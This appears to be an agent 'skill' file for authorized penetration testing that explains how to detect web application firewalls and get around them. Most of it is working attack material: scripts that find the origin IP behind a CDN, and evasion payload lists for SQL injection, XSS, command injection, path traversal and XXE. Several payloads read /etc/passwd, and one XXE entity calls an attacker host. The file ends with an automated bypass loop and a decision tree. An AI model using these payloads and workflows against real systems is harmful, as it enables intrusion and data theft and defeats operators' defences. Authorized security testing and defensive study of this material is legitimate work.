# SKILL — waf-bypass

## Purpose
Detect WAF vendor from response signatures, fingerprint the exact product, and apply the correct evasion technique for the confirmed WAF. Used during authorized penetration testing when payloads are being blocked.

## When to load
- Payloads are returning 403/406/429 or a blocked page
- Responses contain WAF-specific headers or cookies
- Need to confirm whether a WAF is present before testing
- Standard injection payloads are being filtered
- Need to find the origin IP behind a CDN/WAF

---

## Phase 1 — WAF detection

### Probe payloads (trigger WAF without causing damage)
```bash
# Send a known-malicious string and observe response
curl -si "https://target.com/?q=<script>alert(1)</script>" | head -30
curl -si "https://target.com/?id=1' OR '1'='1" | head -30
curl -si "https://target.com/?cmd=cat+/etc/passwd" | head -30

# Compare status codes and response body
# Normal: 200 with expected content
# WAF: 403/406/429/503 or 200 with "blocked" page
```

### Tools
```bash
# wafw00f — automated WAF fingerprinting
wafw00f https://target.com -a | tee recon/tech/waf.txt

# nmap WAF detection
nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint target.com

# Manual header check
curl -sI https://target.com | grep -iE "cf-ray|x-sucuri|x-fw-|incap|akamai|barracuda|mod_sec|bigip"
```

## Phase 3 — Origin IP discovery (bypass CDN/WAF entirely)

Finding the origin IP means the WAF is irrelevant.

```bash
TARGET="target.com"

# 1. Historical DNS (pre-CDN records)
curl -s "https://securitytrails.com/domain/$TARGET/history/a" | grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u
# Also check: https://viewdns.info/iphistory/?domain=$TARGET
# Also check: https://dnsdumpster.com

# 2. Certificate transparency — origin certs often on direct IP
curl -s "https://crt.sh/?q=$TARGET&output=json" | jq -r '.[].name_value' | sort -u

# 3. MX / SPF / DMARC records often expose origin infrastructure
dig MX $TARGET +short
dig TXT $TARGET +short | grep -i "spf\|include\|ip4"
# ip4: entries in SPF often point to mail server on same subnet as web server

# 4. Shodan — search for SSL cert on non-CDN IPs
# Search: ssl.cert.subject.cn:"target.com" -org:"Cloudflare"
# Or: http.title:"target.com" -org:"Cloudflare"

# 5. Subdomains that bypass CDN
for sub in direct origin www2 dev staging test api mail ftp smtp webmail; do
  ip=$(dig +short $sub.$TARGET 2>/dev/null | tail -1)
  if [ ! -z "$ip" ]; then
    echo "$sub.$TARGET -> $ip"
    # Check if this IP is NOT a CDN IP
    curl -sI "http://$ip" -H "Host: $TARGET" | head -5
  fi
done

# 6. Web archive — direct IP references in old URLs
curl -s "https://web.archive.org/cdx/search/cdx?url=$TARGET&output=text&fl=original&limit=1000" \
  | grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u

# 7. Email headers — send contact form, check received headers
# Look for: Received: from <hostname> (<ip>)

# 8. SSL cert SAN — other domains on same cert may not be behind CDN
curl -sk https://$TARGET | openssl s_client -connect $TARGET:443 2>/dev/null \
  | openssl x509 -noout -text | grep "DNS:"
```

## Phase 4 — Evasion techniques by vuln class

### SQL injection evasion

```sql
-- Comment injection (breaks up keywords)
SE/**/LECT, UN/**/ION SE/**/LECT
/*!50000SELECT*/ (MySQL version comment)

-- Whitespace alternatives
SELECT%09FROM   (tab)
SELECT%0aFROM   (newline)
SELECT%0dFROM   (carriage return)
SELECT%0cFROM   (form feed)
SELECT%a0FROM   (non-breaking space)

-- Case randomization
SeLeCt, sElEcT, UNION ALL SELECT

-- Encoding
%55NION (URL encode U)
%u0055NION (Unicode encode U)
\u0055NION

-- Scientific notation (MySQL)
1e0UNION SELECT (no space needed before UNION)
-1e0UNION SELECT

-- Parentheses (no spaces needed)
UNION(SELECT(1),(2),(3))
SELECT(password)FROM(users)

-- Inline comments to break keywords
U%0ANION%0ASELECT
UN%00ION SELECT (null byte — old WAFs)

-- sqlmap tamper scripts for automation
sqlmap -u "URL" --tamper=space2comment,between,randomcase
sqlmap -u "URL" --tamper=space2morehash,charencode,charunicodeencode
sqlmap -u "URL" --tamper=equaltolike,greatest,ifnull2ifisnull
# Full tamper list: sqlmap --list-tampers
```

### XSS evasion

```html
<!-- No angle brackets -->
" onmouseover="alert(1)" x="
" autofocus onfocus="alert(1)
" onpointerrawupdate="alert(1)

<!-- Tag case -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- No space in tag -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Encoding -->
<script>\u0061lert(1)</script>
<script>eval('\x61\x6c\x65\x72\x74\x281\x29')</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>setTimeout`alert\x281\x29`</script>

<!-- Template literals (bypass quote filters) -->
<script>alert`1`</script>
<script>alert`${1}`</script>

<!-- Protocol handlers -->
<a href="javascript:alert(1)">x</a>
<a href="java&#115;cript:alert(1)">x</a>
<a href="java%0ascript:alert(1)">x</a>

<!-- SVG namespace -->
<svg><script>alert(1)</script></svg>
<svg><script href="data:,alert(1)" />
<math><mtext><script>alert(1)</script></mtext></math>

<!-- Event handlers that bypass keyword filters -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<video onloadeddata=alert(1) src=1>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
```

### Command injection evasion

```bash
# Separator alternatives
;id
|id
||id
&id
&&id
%0aid   (newline)
%0did   (carriage return)

# Backticks and $()
`id`
$(id)
$((id))

# Whitespace bypass
{id}
${IFS}id   (IFS = space in bash)
id${IFS}>/tmp/x
cat${IFS}/etc/passwd
ca''t${IFS}/etc/passwd   (empty string in middle of command)
ca$'\t't${IFS}/etc/passwd

# Encoding
$(printf '\x69\x64')   (prints 'id')
$(echo aWQ= | base64 -d)   (base64 of 'id')

# Variable tricks
$cmd='id';$cmd
c=id;$c
a=i;b=d;$a$b

# Wildcard expansion
/???/??t /etc/passwd   (/bin/cat /etc/passwd)
/???/b??h -c id        (/bin/bash -c id)
```

### Path traversal evasion

```
# Standard
../../../etc/passwd

# URL encoding
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
..%252F..%252Fetc%252Fpasswd

# Unicode
..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd

# Mixed slashes
....//....//....//etc/passwd
..\/..\/..\/etc\/passwd
..%5c..%5c..%5cetc%5cpasswd

# Null byte (old systems)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# URL normalization bypass
/api/../admin/secret
/api/./../../etc/passwd
```

### XXE evasion

```xml
<!-- UTF-16 encoding (some WAFs only check UTF-8) -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Parameter entities for blind XXE -->
<!DOCTYPE r [<!ENTITY % x SYSTEM "http://<LHOST>/"> %x;]>

<!-- Obfuscated entity reference -->
<!DOCTYPE r [<!ENTITY x "fil" ><!ENTITY y "e:///etc/pass" ><!ENTITY z "wd" >]>
<r>&x;&y;&z;</r>

<!-- CDATA bypass for content filtering -->
<!DOCTYPE r [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % content SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % combined "<!ENTITY all '%start;%content;%end;'>">
  %combined;
]>
<r>&all;</r>
```

## Phase 5 — Automated evasion workflow

```bash
# Step 1 — Confirm WAF is blocking (baseline)
NORMAL=$(curl -so /dev/null -w "%{http_code}" "https://target.com/page")
BLOCKED=$(curl -so /dev/null -w "%{http_code}" "https://target.com/page?q=<script>alert(1)</script>")
echo "Normal: $NORMAL | With payload: $BLOCKED"

# Step 2 — Identify WAF vendor
wafw00f https://target.com -a

# Step 3 — Try encoding variants (automated)
PAYLOADS=(
  "<script>alert(1)</script>"
  "%3Cscript%3Ealert(1)%3C/script%3E"
  "%253Cscript%253Ealert(1)%253C/script%253E"
  "<ScRiPt>alert(1)</ScRiPt>"
  "<svg onload=alert(1)>"
  "<img src=x onerror=alert(1)>"
  "javascript:alert(1)"
)
for p in "${PAYLOADS[@]}"; do
  code=$(curl -so /dev/null -w "%{http_code}" "https://target.com/page?q=$p")
  echo "[$code] $p"
done

# Step 4 — If all blocked, attempt origin IP discovery
# Run origin discovery commands from Phase 3

# Step 5 — Test directly against origin IP
curl -H "Host: target.com" "http://<ORIGIN_IP>/page?q=<script>alert(1)</script>"
```

## Phase 6 — ModSecurity CRS specific

ModSecurity with Core Rule Set is the most common open-source WAF. Paranoia levels 1-4.

```
PL1 (default) — block obvious attacks
PL2 — stricter, blocks more encoding tricks
PL3 — very strict
PL4 — extremely strict (rare in production)

PL1 bypass techniques:
- Simple comment injection in SQL
- Mixed case keywords
- Basic URL encoding

PL2 bypass:
- Double encoding
- Unicode normalization
- HTTP parameter pollution

PL3/PL4 (if encountered — try origin IP first):
- Nearly impossible to bypass with standard payloads
- Focus on finding origin IP and bypassing entirely
```

```bash
# Detect ModSecurity paranoia level (infer from which payloads get blocked)
# PL1: only basic payloads blocked
# PL2: encoded payloads also blocked
# PL3+: almost everything blocked

# SQLi bypass for ModSec PL1-2
sqlmap -u "https://target.com/page?id=1" \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent --delay=1

# XSS bypass for ModSec PL1-2
ffuf -u "https://target.com/page?q=FUZZ" \
  -w /home/fox/SecLists/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt \
  -mc 200 -fs <normal_size>
```

## Decision tree

```
Payloads blocked?
├── Yes
│   ├── Run wafw00f -> vendor identified?
│   │   ├── Yes -> apply vendor-specific bypass from Phase 4
│   │   └── No  -> try generic encoding variants from Phase 4
│   │
│   ├── All encoding variants blocked?
│   │   ├── Yes -> attempt origin IP discovery (Phase 3)
│   │   │   ├── Origin found -> test directly against origin IP
│   │   │   └── Origin not found -> document as blocked, move to next finding
│   │   └── No  -> use working bypass variant for exploitation
│   │
└── No -> WAF not blocking this class, proceed with standard payloads
```

---

## Rules
- Always baseline the normal response before testing bypasses
- Document which bypass worked and which didn't — this is engagement data
- Origin IP bypass is always preferred over evasion — simpler and more reliable
- If ModSec PL3+ or Cloudflare Enterprise is confirmed, prioritize origin IP discovery over evasion
- Never assume a WAF is blocking everything — test each vuln class separately, WAF rules are inconsistent
